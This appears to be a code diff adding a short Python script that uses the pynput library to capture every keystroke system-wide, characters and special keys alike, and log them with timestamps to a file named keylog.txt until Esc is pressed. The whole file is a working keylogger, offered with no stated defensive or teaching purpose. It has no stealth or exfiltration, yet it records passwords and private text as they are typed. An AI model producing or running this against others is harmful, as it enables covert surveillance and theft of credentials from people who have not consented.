@@ -1,0 +1,26 @@
+from pynput import keyboard
+import logging
+
+# Set up logging to file
+logging.basicConfig(
+    filename="keylog.txt",  # Log file name
+    level=logging.DEBUG,     # Log level
+    format='%(asctime)s: %(message)s',  # Log format
+)
+
+def on_press(key):
+    try:
+        # Log the key pressed
+        logging.info(f'Key {key.char} pressed.')
+    except AttributeError:
+        # Handle special keys (like Shift, Ctrl, etc.)
+        logging.info(f'Special key {key} pressed.')
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Start the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
